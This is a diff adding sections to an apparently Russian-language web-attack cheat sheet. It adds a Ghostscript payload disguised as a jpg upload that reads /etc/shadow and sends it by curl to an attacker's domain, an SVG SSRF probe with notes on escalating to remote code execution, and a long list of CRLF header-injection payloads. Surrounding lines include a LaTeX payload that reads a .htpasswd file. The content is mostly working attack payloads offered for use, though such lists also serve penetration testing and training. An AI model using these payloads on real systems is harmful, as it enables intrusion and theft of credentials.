@@ -198,6 +198,94 @@ bypass filter with new line
 ```
 $\lstinputlisting{/var/www/dev/.htpasswd}$
 ```
+---
+#### upload bypass
+```
+jpg с вот таким содержимым:
+
+%!PS
+userdict /setpagedevice undef
+legal
+{ null restore } stopped { pop } if
+legal
+mark /OutputFile (var=cat /etc/shadow | base64 && curl YOUR_DOMAIN.LOL/?ssr=$var) currentdevice putdeviceprops
+
+где твой домен точка лол - это твой домен, на который придет пинг. Я для таких целей использую либо requestbin.com, (https://api0.pw/api_0/requestbin.com) либо поднимаю ngrok.
+```
+
+```
+<svg width="200" height="200" 
+xmlns="http://www.w3.org/2000/svg" (http://www.w3.org/2000/svg) xmlns:xlink="http://www.w3.org/1999/xlink"> (http://www.w3.org/1999/xlink) 
+<image xlink:href='YOUR_DOMAIN' x='0' y='0' height='1' width='1'/> 
+</svg>
+И если пинг на твой домен пришел, то ссрф прошло. Но на этом останавливаться не стоит, ведь там может быть rce (Remote Code Execution), и проверяется она точно так же, но в код svg вставляется либо курл на ваш домен, либо что-нибудь типа etc/passwd и так же отправляется на домен.
+```
+---
+#### CRLF payloads
+```
+%0AHeader-Test:POXEK
+%0A%20Header-Test:POXEK
+%20%0AHeader-Test:POXEK
+%23%OAHeader-Test:POXEK
+%E5%98%8A%E5%98%8DHeader-Test:POXEK
+%E5%98%8A%E5%98%8D%0AHeader-Test:POXEK
+%3F%0AHeader-Test:POXEK
+crlf%0AHeader-Test:POXEK
+crlf%0A%20Header-Test:POXEK
+crlf%20%0AHeader-Test:POXEK
+crlf%23%OAHeader-Test:POXEK
+crlf%E5%98%8A%E5%98%8DHeader-Test:POXEK
+crlf%E5%98%8A%E5%98%8D%0AHeader-Test:POXEK
+crlf%3F%0AHeader-Test:POXEK
+%0DHeader-Test:POXEK
+%0D%20Header-Test:POXEK
+%20%0DHeader-Test:POXEK
+%23%0DHeader-Test:POXEK
+%23%0AHeader-Test:POXEK
+%E5%98%8A%E5%98%8DHeader-Test:POXEK
+%E5%98%8A%E5%98%8D%0DHeader-Test:POXEK
+%3F%0DHeader-Test:POXEK
+crlf%0DHeader-Test:POXEK
+crlf%0D%20Header-Test:POXEK
+crlf%20%0DHeader-Test:POXEK
+crlf%23%0DHeader-Test:POXEK
+crlf%23%0AHeader-Test:POXEK
+crlf%E5%98%8A%E5%98%8DHeader-Test:POXEK
+crlf%E5%98%8A%E5%98%8D%0DHeader-Test:POXEK
+crlf%3F%0DHeader-Test:POXEK
+%0D%0AHeader-Test:POXEK
+%0D%0A%20Header-Test:POXEK
+%20%0D%0AHeader-Test:POXEK
+%23%0D%0AHeader-Test:POXEK
+\r\nHeader-Test:POXEK
+ \r\n Header-Test:POXEK
+\r\n Header-Test:POXEK
+%5cr%5cnHeader-Test:POXEK
+%E5%98%8A%E5%98%8DHeader-Test:POXEK
+%E5%98%8A%E5%98%8D%0D%0AHeader-Test:POXEK
+%3F%0D%0AHeader-Test:POXEK
+crlf%0D%0AHeader-Test:POXEK
+crlf%0D%0A%20Header-Test:POXEK
+crlf%20%0D%0AHeader-Test:POXEK
+crlf%23%0D%0AHeader-Test:POXEK
+crlf\r\nHeader-Test:POXEK
+crlf%5cr%5cnHeader-Test:POXEK
+crlf%E5%98%8A%E5%98%8DHeader-Test:POXEK
+crlf%E5%98%8A%E5%98%8D%0D%0AHeader-Test:POXEK
+crlf%3F%0D%0AHeader-Test:POXEK
+%0D%0A%09Header-Test:POXEK
+crlf%0D%0A%09Header-Test:POXEK
+%250AHeader-Test:POXEK
+%25250AHeader-Test:POXEK
+%%0A0AHeader-Test:POXEK
+%25%30AHeader-Test:POXEK
+%25%30%61Header-Test:POXEK
+%u000AHeader-Test:POXEK
+//www.google.com/%2F%2E%2E%0D%0AHeader-Test:POXEK
+/www.google.com/%2E%2E%2F%0D%0AHeader-Test:POXEK
+/google.com/%2F..%0D%0AHeader-Test:POXEK
+```
+---
 #### links
 - [steal admin cookie/sqli](./src/marketplace.md) (tryhackme:marketplace)
 - [ohmyweb](./src/omyweb.md)
